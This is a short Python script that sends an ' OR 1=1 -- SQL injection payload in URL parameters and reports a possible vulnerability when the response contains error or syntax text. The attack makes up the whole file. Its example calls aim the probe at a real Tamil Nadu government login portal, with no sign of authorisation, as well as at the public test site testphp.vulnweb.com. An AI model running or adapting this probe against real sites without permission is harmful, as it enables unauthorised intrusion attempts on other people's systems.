import requests

def check_sql_injection(url, param):
    payload = f"{url}?{param}=' OR 1=1 --"
    response = requests.get(payload)
    if "error" in response.text.lower() or "syntax" in response.text.lower():
        print(f"[!] Potential SQL injection vulnerability at: {payload}")
    else:
        print(f"[✓] Seems safe: {url}")

# Example Usage
check_sql_injection("https://portal.naanmudhalvan.tn.gov.in/login", "login")
check_sql_injection("http://example.com/search", "query")
check_sql_injection("http://testphp.vulnweb.com/login.php", "username")
check_sql_injection("http://testphp.vulnweb.com/search.php", "search")
